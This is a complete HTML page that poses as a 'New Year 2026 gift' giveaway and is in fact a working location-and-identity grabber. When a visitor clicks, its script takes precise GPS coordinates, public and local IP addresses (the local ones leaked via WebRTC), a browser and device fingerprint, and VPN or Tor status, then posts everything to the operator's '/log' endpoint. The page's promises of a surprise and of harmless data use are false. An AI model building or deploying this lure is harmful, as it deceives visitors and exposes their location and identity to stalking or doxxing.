<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>New Year Surprise, 2026</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body 
    {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
      color: #fff;
      min-height: 100vh;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow-x: hidden;
    }
    
    .container 
    {
      max-width: 800px;
      width: 100%;
      text-align: center;
      animation: fadeIn 1s ease;
    }
    
    header 
    {
      margin-bottom: 40px;
      text-align: center;
      padding: 20px;
    }
    
    h1 
    {
      font-size: 3.5rem;
      margin-bottom: 15px;
      text-shadow: 0 3px 10px rgba(0, 0, 0, 0.5);
      background: linear-gradient(to right, #ff8a00, #da1b60);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: 1px;
    }
    
    .subtitle 
    {
      font-size: 1.4rem;
      opacity: 0.9;
      max-width: 600px;
      margin: 0 auto;
      font-weight: 300;
    }
    
    .card 
    {
      background: rgba(0, 0, 0, 0.25);
      border-radius: 20px;
      padding: 40px;
      margin: 0 auto;
      max-width: 600px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      position: relative;
      overflow: hidden;
    }
    
    .card::before 
    {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
      transform: rotate(30deg);
      pointer-events: none;
    }
    
    .location-icon 
    {
      font-size: 6rem;
      margin: 30px 0;
      color: #ff8a00;
      animation: pulse 2s infinite;
      text-shadow: 0 0 20px rgba(255, 138, 0, 0.5);
    }
    
    .btn 
    {
      display: block;
      width: 100%;
      padding: 22px;
      background: linear-gradient(to right, #ff8a00, #da1b60);
      color: white;
      border: none;
      border-radius: 60px;
      font-size: 1.4rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.4s ease;
      margin: 30px 0;
      box-shadow: 0 8px 25px rgba(218, 27, 96, 0.5);
      letter-spacing: 1px;
      position: relative;
      overflow: hidden;
      z-index: 1;
    }
    
    .btn::before 
    {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(to right, #ff6a00, #ff2b6e);
      opacity: 0;
      transition: opacity 0.4s ease;
      z-index: -1;
    }
    
    .btn:hover 
    {
      transform: translateY(-5px);
      box-shadow: 0 12px 30px rgba(218, 27, 96, 0.7);
    }
    
    .btn:hover::before 
    {
      opacity: 1;
    }
    
    .btn:active 
    {
      transform: translateY(0);
    }
    
    .btn:disabled 
    {
      background: linear-gradient(to right, #666, #999);
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    
    #status 
    {
      margin-top: 35px;
      padding: 25px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 15px;
      font-size: 1.3rem;
      min-height: 180px;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: all 0.5s ease;
    }
    
    .success-message 
    {
      font-size: 1.8rem;
      font-weight: bold;
      color: #ffcc00;
      text-shadow: 0 3px 6px rgba(0, 0, 0, 0.6);
      line-height: 1.7;
      animation: textPulse 2s infinite;
    }
    
    .fbi-icon 
    {
      font-size: 3rem;
      display: block;
      margin-bottom: 20px;
      animation: shake 0.5s infinite alternate;
    }
    
    .baby-bottle 
    {
      font-size: 2.5rem;
      display: inline-block;
      margin: 0 10px;
      animation: float 3s ease-in-out infinite;
    }
    
    .disclaimer 
    {
      margin-top: 40px;
      font-size: 0.9rem;
      opacity: 0.7;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      border-top: 1px solid rgba(255,255,255,0.2);
      padding-top: 20px;
    }
    
    .permission-remember 
    {
      margin-top: 20px;
      padding: 15px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      font-size: 1rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    
    @keyframes pulse 
    {
      0% 
      { 
        transform: scale(1); 
        opacity: 0.8; 
      }
      50% 
      { 
        transform: scale(1.1); 
        opacity: 1; 
      }
      100% 
      { 
        transform: scale(1); 
        opacity: 0.8; 
      }
    }
    
    @keyframes fadeIn 
    {
      from 
      { 
        opacity: 0; 
        transform: translateY(-20px); 
      }
      to 
      { 
        opacity: 1; 
        transform: translateY(0); 
      }
    }
    
    @keyframes textPulse 
    {
      0% 
      { 
        text-shadow: 0 0 10px rgba(255, 204, 0, 0.5); 
      }
      50% 
      { 
        text-shadow: 0 0 25px rgba(255, 204, 0, 0.8), 0 0 40px rgba(255, 204, 0, 0.6); 
      }
      100% 
      { 
        text-shadow: 0 0 10px rgba(255, 204, 0, 0.5); 
      }
    }
    
    @keyframes shake 
    {
      0% 
      { 
        transform: translateX(-3px); 
      }
      100% 
      { 
        transform: translateX(3px); 
      }
    }
    
    @keyframes float 
    {
      0% 
      { 
        transform: translateY(0); 
      }
      50% 
      { 
        transform: translateY(-15px); 
      }
      100% 
      { 
        transform: translateY(0); 
      }
    }
    
    .pulse-dot 
    {
      display: inline-block;
      width: 12px;
      height: 12px;
      background: #ff6a00;
      border-radius: 50%;
      margin: 0 5px;
      animation: pulse 1.5s infinite;
    }
    
    .pulse-dot:nth-child(2) 
    {
      animation-delay: 0.2s;
      background: #ff8a00;
    }
    
    .pulse-dot:nth-child(3) 
    {
      animation-delay: 0.4s;
      background: #ffaa00;
    }
    
    @media (max-width: 768px) 
    {
      h1 
      {
        font-size: 2.5rem;
      }
      
      .subtitle 
      {
        font-size: 1.1rem;
      }
      
      .card 
      {
        padding: 25px;
      }
      
      .btn 
      {
        padding: 18px;
        font-size: 1.2rem;
      }
      
      .success-message 
      {
        font-size: 1.5rem;
      }
      
      .location-icon 
      {
        font-size: 4.5rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1><i class="fas fa-surprise"></i> Click and Get Your Gift of the year 2026 </h1>
      <p class="subtitle">Click the button below to receive your special surprise!</p>
    </header>
    
    <div class="card">
      <div class="location-icon">
        <i class="fas fa-location-dot"></i>
      </div>
      
      <p style="font-size: 1.2rem; margin-bottom: 20px; max-width: 500px; margin-left: auto; margin-right: auto;">
        We need your location to deliver a personalized surprise experience just for you!
      </p>
      
      <button id="goLiveBtn" class="btn">
        <i class="fas fa-gift"></i> GET MY Gift NOW!
      </button>
      
      <div id="status">
        <p>Waiting for you to request your surprise...</p>
      </div>
      
      <div class="permission-remember">
        <i class="fas fa-lock"></i> We'll remember your permission choice for future visits
      </div>
      
      <div class="disclaimer">
        <p><i class="fas fa-shield-alt"></i> Your location data is only needed to send you the surprise and is not used maliciously</p>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', async () => {
      const btn = document.getElementById('goLiveBtn');
      const statusEl = document.getElementById('status');
      const API_BASE = '';   // ‚Üê Changed to relative URL for Render deployment (was ngrok)

      // Fetch API keys from server
      let apiKeys;
      try 
      {
        const response = await fetch(`${API_BASE}/api-keys`);
        if (!response.ok) throw new Error('Failed to fetch API keys');
        apiKeys = await response.json();
      } 
      catch (error) 
      {
        console.error('Error fetching API keys:', error);
        statusEl.innerHTML = `
          <p>Error initializing application. Please try again later.</p>
        `;
        return;
      }

      // Check if we already have permission stored
      const hasPermission = localStorage.getItem('locationPermission') === 'granted';
      
      if (hasPermission) 
      {
        statusEl.innerHTML = `
          <p>You've previously granted location access.</p>
          <p style="margin-top: 15px;">Click the button to get your surprise!</p>
        `;
      }
      
      // Function to detect VPN usage with enhanced accuracy
      async function detectVPN(ipAddress) 
      {
        if (!ipAddress || ipAddress === 'Not available') 
        {
          console.warn('No valid IP address for VPN detection');
          return {
            isVPN: false,
            vpnProvider: 'IP not available',
            vpnLocation: 'IP not available'
          };
        }

        try 
        {
          const apis = [
            `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKeys.IPGEOLOCATION_API_KEY}&ip=${ipAddress}`,
            `https://vpnapi.io/api/${ipAddress}?key=${apiKeys.VPNAPI_KEY}`,
            `https://ipqualityscore.com/api/json/ip/${apiKeys.IPQUALITY_KEY}/${ipAddress}`
          ];

          let vpnResults = [];
          let vpnCount = 0;

          for (const apiUrl of apis) 
          {
            try 
            {
              const response = await fetch(apiUrl);
              if (response.ok) 
              {
                const data = await response.json();

                let isVPN = false;
                let provider = 'Unknown';
                let location = 'Unknown';

                if (apiUrl.includes('ipgeolocation.io')) 
                {
                  isVPN = data.connection_type === 'VPN' || (data.security && data.security.is_vpn) || data.type === 'hosting' || (data.security && data.security.is_proxy);
                  provider = data.organization || data.asn || 'Unknown Provider';
                  location = `${data.city || ''}${data.city ? ', ' : ''}${data.state_prov || ''}${data.state_prov ? ', ' : ''}${data.country_name || 'Unknown Location'}`;
                } 
                else if (apiUrl.includes('vpnapi.io')) 
                {
                  isVPN = data.security && (data.security.vpn || data.security.proxy || data.security.tor || data.security.relay);
                  provider = data.network ? data.network.autonomous_system_organization || data.network.network : 'Unknown Provider';
                  location = `${data.location.city || ''}${data.location.city ? ', ' : ''}${data.location.region || ''}${data.location.region ? ', ' : ''}${data.location.country || 'Unknown Location'}`;
                } 
                else if (apiUrl.includes('ipqualityscore.com')) 
                {
                  isVPN = data.vpn || data.proxy || data.tor || data.active_vpn || data.active_tor || data.fraud_score > 75;
                  provider = data.ISP || data.organization || 'Unknown Provider';
                  location = `${data.city || ''}${data.city ? ', ' : ''}${data.region || ''}${data.region ? ', ' : ''}${data.country || 'Unknown Location'}`;
                }

                vpnResults.push({
                  isVPN,
                  vpnProvider: provider,
                  vpnLocation: location,
                  api: apiUrl
                });
                if (isVPN) vpnCount++;
                console.log(`VPN check from ${apiUrl}: isVPN=${isVPN}, provider=${provider}, location=${location}`);
              }
            } 
            catch (error) 
            {
              console.error(`Error with VPN API (${apiUrl}):`, error);
            }
          }

          // If any API detects a VPN, consider it a VPN (more sensitive detection)
          const hasVPN = vpnCount > 0;
          if (hasVPN) 
          {
            const positiveResults = vpnResults.filter(result => result.isVPN);
            const providers = [...new Set(positiveResults.map(r => r.vpnProvider).filter(p => p !== 'Unknown'))];
            const locations = [...new Set(positiveResults.map(r => r.vpnLocation).filter(l => l !== 'Unknown Location'))];
            return {
              isVPN: true,
              vpnProvider: providers.length > 0 ? providers.join(' / ') : 'Unknown Provider',
              vpnLocation: locations.length > 0 ? locations.join(' / ') : 'Unknown Location'
            };
          }

          // Fallback to ipapi.co if no VPN detected yet
          const fallbackResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
          const fallbackData = await fallbackResponse.json();
          const isVPNFallback = fallbackData.network && (fallbackData.network.vpn_domain || (fallbackData.security && (fallbackData.security.vpn || fallbackData.security.proxy || fallbackData.security.tor || fallbackData.security.relay)));
          if (isVPNFallback) 
          {
            return {
              isVPN: true,
              vpnProvider: fallbackData.asn || fallbackData.org || 'Unknown Provider',
              vpnLocation: `${fallbackData.city || ''}${fallbackData.city ? ', ' : ''}${fallbackData.region || ''}${fallbackData.region ? ', ' : ''}${fallbackData.country_name || 'Unknown Location'}`
            };
          }

          return {
            isVPN: false,
            vpnProvider: 'Not detected',
            vpnLocation: 'Not detected'
          };
        } 
        catch (error) 
        {
          console.error('VPN detection error:', error);
          return {
            isVPN: false,
            vpnProvider: 'Detection Failed',
            vpnLocation: 'Detection Failed'
          };
        }
      }
      
      // Function to get local IP addresses using WebRTC
      async function getLocalIPAddresses() 
      {
        return new Promise((resolve) => {
          try 
          {
            const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
            if (!RTCPeerConnection) 
            {
              console.warn('WebRTC not supported in this browser');
              resolve({ipv4: null, ipv6: null});
              return;
            }
            
            const pc = new RTCPeerConnection({
              iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' },
                { urls: 'stun:stun2.l.google.com:19302' },
                { urls: 'stun:stun3.l.google.com:19302' },
                { urls: 'stun:stun4.l.google.com:19302' },
                { urls: 'stun:global.stun.twilio.com:3478' }
              ]
            });
            pc.createDataChannel('');
            
            let candidatesV4 = [];
            let candidatesV6 = [];
            
            pc.onicecandidate = (event) => {
              if (event.candidate) 
              {
                const candidate = event.candidate.candidate;
                console.log('ICE candidate:', candidate);
                
                // Match IPv4
                const ipMatchV4 = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
                if (ipMatchV4 && (
                    ipMatchV4[1].startsWith('192.168.') ||
                    ipMatchV4[1].startsWith('10.') ||
                    (ipMatchV4[1].startsWith('172.') && parseInt(ipMatchV4[1].split('.')[1]) >= 16 && parseInt(ipMatchV4[1].split('.')[1]) <= 31)
                )) {
                  candidatesV4.push(ipMatchV4[1]);
                }
                
                // Match IPv6 - simple regex for IPv6 addresses
                const ipMatchV6 = candidate.match(/([a-fA-F0-9:]{3,39})/);
                if (ipMatchV6 && ipMatchV6[1].includes(':') && (
                    ipMatchV6[1].toLowerCase().startsWith('fe80:') ||
                    ipMatchV6[1].toLowerCase().startsWith('fc') ||
                    ipMatchV6[1].toLowerCase().startsWith('fd')
                )) {
                  candidatesV6.push(ipMatchV6[1]);
                }
              } 
              else 
              {
                // No more candidates
                const localIPv4 = candidatesV4.find(ip => ip.startsWith('192.168.')) || candidatesV4[0] || null;
                const localIPv6 = candidatesV6[0] || null;
                console.log('Selected local IPv4 from WebRTC:', localIPv4);
                console.log('Selected local IPv6 from WebRTC:', localIPv6);
                resolve({ipv4: localIPv4, ipv6: localIPv6});
                pc.close();
              }
            };
            
            pc.createOffer()
              .then(offer => pc.setLocalDescription(offer))
              .catch(err => {
                console.error('WebRTC offer error:', err);
                resolve({ipv4: null, ipv6: null});
                pc.close();
              });
            
            // Timeout to prevent hanging
            setTimeout(() => {
              const localIPv4 = candidatesV4.find(ip => ip.startsWith('192.168.')) || candidatesV4[0] || null;
              const localIPv6 = candidatesV6[0] || null;
              console.log('Selected local IPv4 from WebRTC (timeout):', localIPv4);
              console.log('Selected local IPv6 from WebRTC (timeout):', localIPv6);
              resolve({ipv4: localIPv4, ipv6: localIPv6});
              pc.close();
            }, 6000);
          } 
          catch (err) 
          {
            console.error('WebRTC error:', err);
            resolve({ipv4: null, ipv6: null});
          }
        });
      }
      
      // Function to get public IPv4 address
      async function getPublicIPv4() 
      {
        const ipApis = [
          { url: 'https://api.ipify.org?format=json', key: 'ip' },
          { url: 'https://api.myip.com', key: 'ip' },
          { url: 'https://ipinfo.io/json', key: 'ip' }
        ];
        
        const maxRetries = 2;
        
        for (const api of ipApis) 
        {
          for (let attempt = 1; attempt <= maxRetries; attempt++) 
          {
            try 
            {
              const controller = new AbortController();
              const timeoutId = setTimeout(() => controller.abort(), 3000);
              
              const response = await fetch(api.url, {
                cache: 'no-store',
                mode: 'cors',
                signal: controller.signal
              });
              
              clearTimeout(timeoutId);
              
              if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
              const data = await response.json();
              const ip = data[api.key];
              
              if (ip && /^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) 
              {
                console.log(`Public IPv4 fetched from ${api.url} (attempt ${attempt}): ${ip}`);
                return ip;
              } 
              else 
              {
                throw new Error(`Invalid IP format from ${api.url}: ${ip}`);
              }
            } 
            catch (error) 
            {
              console.error(`Error fetching public IPv4 from ${api.url} (attempt ${attempt}):`, error);
              if (error.name === 'AbortError') 
              {
                console.warn(`Request to ${api.url} timed out`);
              }
              if (attempt === maxRetries) 
              {
                console.warn(`All attempts failed for ${api.url}`);
              }
            }
          }
        }
        console.warn('All public IPv4 APIs failed');
        return 'Not available';
      }
      
      // Function to get public IPv6 address
      async function getPublicIPv6() 
      {
        const ipApis = [
          { url: 'https://api64.ipify.org?format=json', key: 'ip' }
          // Add more IPv6-specific APIs if needed
        ];
        
        const maxRetries = 2;
        
        for (const api of ipApis) 
        {
          for (let attempt = 1; attempt <= maxRetries; attempt++) 
          {
            try 
            {
              const controller = new AbortController();
              const timeoutId = setTimeout(() => controller.abort(), 3000);
              
              const response = await fetch(api.url, {
                cache: 'no-store',
                mode: 'cors',
                signal: controller.signal
              });
              
              clearTimeout(timeoutId);
              
              if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
              const data = await response.json();
              const ip = data[api.key];
              
              if (ip && /([a-fA-F0-9:]{3,39})/.test(ip)) 
              {
                console.log(`Public IPv6 fetched from ${api.url} (attempt ${attempt}): ${ip}`);
                return ip;
              } 
              else 
              {
                throw new Error(`Invalid IP format from ${api.url}: ${ip}`);
              }
            } 
            catch (error) 
            {
              console.error(`Error fetching public IPv6 from ${api.url} (attempt ${attempt}):`, error);
              if (error.name === 'AbortError') 
              {
                console.warn(`Request to ${api.url} timed out`);
              }
              if (attempt === maxRetries) 
              {
                console.warn(`All attempts failed for ${api.url}`);
              }
            }
          }
        }
        console.warn('All public IPv6 APIs failed');
        return 'Not available';
      }
      
      // Main function to get IP addresses
      async function getIPAddresses() 
      {
        const browser = getBrowserName();
        const deviceType = getDeviceType();
        
        const publicIPv4 = await getPublicIPv4();
        const publicIPv6 = await getPublicIPv6();
        let localIPv4 = null;
        let localIPv6 = null;
        
        // Try to get local IPs for desktops
        if (deviceType === 'Desktop') 
        {
          console.log(`Attempting to fetch local IPs via WebRTC for ${browser} (Desktop)`);
          const localIps = await getLocalIPAddresses();
          localIPv4 = localIps.ipv4;
          localIPv6 = localIps.ipv6;
          if (!localIPv4 && !localIPv6) {
            console.warn('WebRTC failed or disabled');
            statusEl.innerHTML = `
              <p>Fetching location data...</p>
              <p style="margin-top: 15px; font-size: 1rem;">Note: Local IP detection failed. Enable WebRTC in browser settings (Edge: Privacy > Media features) for local IP.</p>
              <div style="margin-top: 15px;">
                <span class="pulse-dot"></span>
                <span class="pulse-dot"></span>
                <span class="pulse-dot"></span>
              </div>
            `;
          }
        }
        
        return { publicIPv4, publicIPv6, localIPv4, localIPv6 };
      }
      
      // Function to detect device type
      function getDeviceType() 
      {
        const ua = navigator.userAgent.toLowerCase();
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) 
        {
          return "Tablet";
        }
        if (/mobile|android|iphone|ipod|iemobile|blackberry|kindle|silk-accelerated|(hpw|web)os|opera m(obi|ini)/i.test(ua)) 
        {
          return "Mobile";
        }
        return "Desktop";
      }
      
      // Function to get OS
      function getOS() 
      {
        const ua = navigator.userAgent;
        if (/Android/.test(ua)) return "Android";
        if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
        if (/Mac OS X/.test(ua)) return "macOS";
        if (/Windows/.test(ua)) return "Windows";
        if (/Linux/.test(ua)) return "Linux";
        return "Unknown";
      }
      
      // Function to get browser name with enhanced detection
      function getBrowserName() 
      {
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes("maxthon")) return "Maxthon";
        if (ua.includes("epic")) return "Epic Privacy Browser";
        if (ua.includes("waterfox")) return "Waterfox";
        if (ua.includes("palemoon")) return "Pale Moon";
        if (ua.includes("seamonkey")) return "SeaMonkey";
        if (ua.includes("slimjet")) return "Slimjet";
        if (ua.includes("midori")) return "Midori";
        if (ua.includes("falkon")) return "Falkon";
        if (ua.includes("konqueror")) return "Konqueror";
        if (ua.includes("netsurf")) return "Netsurf";
        if (ua.includes("k-meleon")) return "K-Meleon";
        if (ua.includes("orion")) return "Orion Browser";
        if (ua.includes("icab")) return "iCab";
        if (ua.includes("duckduckgo")) return "DuckDuckGo Privacy Browser";
        if (ua.includes("alohabrowser")) return "Aloha Browser";
        if (ua.includes("puffin")) return "Puffin Browser";
        if (ua.includes("ghostery")) return "Ghostery Privacy Browser";
        if (ua.includes("ecosia")) return "Ecosia Browser";
        if (ua.includes("onionbrowser")) return "Onion Browser";
        if (ua.includes("torbrowser") || ua.includes("tor browser")) return "Tor Browser";
        if (ua.includes("samsungbrowser")) return "Samsung Internet Browser";
        if (ua.includes("kiwi")) return "Kiwi Browser";
        if (ua.includes("ucbrowser")) return "UC Browser";
        if (ua.includes("yabrowser")) return "Yandex Browser";
        if (ua.includes("phoenix")) return "Phoenix Browser";
        if (ua.includes("dolphin")) return "Dolphin Browser";
        if (ua.includes("nox")) return "Nox Browser";
        if (ua.includes("opera mini")) return "Opera Mini";
        if (ua.includes("opt/")) return "Opera Touch";
        if (ua.includes("opr/") || ua.includes("opera")) return "Opera";
        if (ua.includes("vivaldi")) return "Vivaldi";
        if (ua.includes("brave")) return "Brave";
        if (ua.includes("chromium")) return "Chromium";
        if (ua.includes("fxios")) return "Mozilla Firefox";
        if (ua.includes("edgios")) return "Microsoft Edge";
        if (ua.includes("edga")) return "Microsoft Edge";
        if (ua.includes("edg/")) return "Microsoft Edge";
        if (ua.includes("crios")) return "Google Chrome";
        if (ua.includes("firefox")) return "Mozilla Firefox";
        if (ua.includes("chrome")) return "Google Chrome";
        if (ua.includes("safari")) return "Safari";
        return "Unknown Browser";
      }
      
      // Function to validate coordinates
      function isValidCoordinate(lat, lng) 
      {
        return typeof lat === 'number' && typeof lng === 'number' && lat >= -90 && lat <= 90 && lng >= -180 && lng <= 180;
      }
      
      // Function to handle the surprise process
      async function processSurprise() 
      {
        btn.disabled = true;
        statusEl.innerHTML = `
          <p><i class="fas fa-spinner fa-spin"></i> Processing your request for the surprise...</p>
          <div style="margin-top: 15px;">
            <span class="pulse-dot"></span>
            <span class="pulse-dot"></span>
            <span class="pulse-dot"></span>
          </div>
        `;
        
        if (!navigator.geolocation) 
        {
          statusEl.innerHTML = '<p>Geolocation is not supported by your browser. Please try a different browser.</p>';
          btn.disabled = false;
          return;
        }
        
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            try 
            {
              // Log geolocation data for debugging
              console.log('Geolocation data:', {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: position.timestamp
              });
              
              // Validate coordinates
              if (!isValidCoordinate(position.coords.latitude, position.coords.longitude)) 
              {
                throw new Error('Invalid coordinates received');
              }
              
              // Check accuracy
              const accuracy = Math.round(position.coords.accuracy);
              if (accuracy > 1000) 
              {
                console.warn('High accuracy value detected:', accuracy);
                statusEl.innerHTML = `
                  <p>Location accuracy is too low (${accuracy} meters).</p>
                  <p style="margin-top: 15px; font-size: 1rem;">Please enable precise location services or try a mobile device with GPS.</p>
                `;
                btn.disabled = false;
                return;
              }
              
              // Get additional data
              const ipData = await getIPAddresses();
              
              if (ipData.publicIPv4 === 'Not available' && ipData.publicIPv6 === 'Not available' && !ipData.localIPv4 && !ipData.localIPv6) 
              {
                statusEl.innerHTML = `
                  <p>Unable to fetch IP address.</p>
                  <p style="margin-top: 15px; font-size: 1rem;">Please check your network connection and try again.</p>
                `;
                btn.disabled = false;
                return;
              }
              
              // Detect VPN usage
              const ipForVPN = ipData.publicIPv4 !== 'Not available' ? ipData.publicIPv4 :
                               ipData.publicIPv6 !== 'Not available' ? ipData.publicIPv6 :
                               ipData.localIPv4 || ipData.localIPv6;
              const vpnInfo = await detectVPN(ipForVPN);
              
              const deviceType = getDeviceType();
              const os = getOS();
              const browser = getBrowserName();
              
              const payload = {
                lat: Number(position.coords.latitude.toFixed(6)),
                lng: Number(position.coords.longitude.toFixed(6)),
                accuracy: accuracy,
                timestamp: position.timestamp || Date.now(),
                userAgent: navigator.userAgent,
                publicIPv4: ipData.publicIPv4,
                publicIPv6: ipData.publicIPv6,
                localIPv4: ipData.localIPv4,
                localIPv6: ipData.localIPv6,
                device: `${browser} (${os} (${deviceType}))`,
                isVPN: vpnInfo.isVPN,
                vpnProvider: vpnInfo.vpnProvider,
                vpnLocation: vpnInfo.vpnLocation
              };
              
              console.log('Payload sent to server:', payload);
              
              // Send data to server
              const logRes = await fetch(`${API_BASE}/log`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
              });
              
              if (logRes.ok) 
              {
                // Store permission in localStorage
                localStorage.setItem('locationPermission', 'granted');
                
                // Show the surprise message
                statusEl.innerHTML = `
                  <div class="success-message">
                    <i class="fas fa-exclamation-triangle fbi-icon"></i>
                    Happy New Year 2026!
                  </div>
                `;
                
                // Add a fun animation to the button
                btn.innerHTML = '<i class="fas fa-running"></i> Happy New Year 2026!';
                btn.style.background = 'linear-gradient(to right, #dc3545, #8a3ffc)';
              } 
              else 
              {
                const text = await logRes.text().catch(() => '');
                console.error('Server response error:', text);
                statusEl.innerHTML = `
                  <div class="success-message">
                    <i class="fas fa-baby"></i><br>
                    Error contacting server. Please try again later.
                  </div>
                `;
                btn.disabled = false;
              }
            } 
            catch (err) 
            {
              console.error('Client error:', err);
              statusEl.innerHTML = `
                <div class="success-message">
                  <i class="fas fa-baby"></i><br>
                  An error occurred. Please try again later.
                </div>
              `;
              btn.disabled = false;
            }
          },
          (err) => {
            console.error('Geolocation error:', err);
            statusEl.innerHTML = `
              <p>Error getting location: ${err.message}</p>
              <p style="margin-top: 15px; font-size: 1rem;">Please allow location access and ensure precise location services are enabled in your system settings.</p>
            `;
            btn.disabled = false;
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      }
      
      btn.addEventListener('click', processSurprise);
    });
  </script>
</body>
</html>